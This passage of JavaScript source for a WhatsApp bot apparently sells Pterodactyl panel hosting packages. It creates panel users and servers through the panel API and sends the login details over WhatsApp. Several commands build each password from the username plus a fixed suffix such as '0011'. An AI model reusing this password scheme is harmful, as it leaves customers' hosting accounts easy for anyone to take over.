"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "srvpaket8": {
       if (cekSaldo(sender,db_saldo) < 13000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp13.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 13000, db_saldo)
break
case "srvpaket9": {
       if (cekSaldo(sender,db_saldo) < 14000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp14.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 14000, db_saldo)
break
case "srvpaket10": {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 15000, db_saldo)
break
            case 'suspend1': {
            if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'suspend2': {
            if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domainn + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend1': {
            if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'unsuspend2': {
            if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domainn + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "1gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "OKTZOFFC"
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "30"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`DONE BY DE4YOU⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs DE4YOUHost🗿
`)

}

break
case "1gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "30"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
reply(`DONE BY DE4YOU⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs DE4YOUHost🗿
`)

}

break
case "1gbb_b": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremiumm && !isOwner) return reply(mess.only.premiumm)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1010"
let cpu = "30"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domainnn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainnn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyyy
}
})
reply(`DONE BY DE4YOU⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs DE4YOUHost🗿
`)

}

break
case "2gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "2gbb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
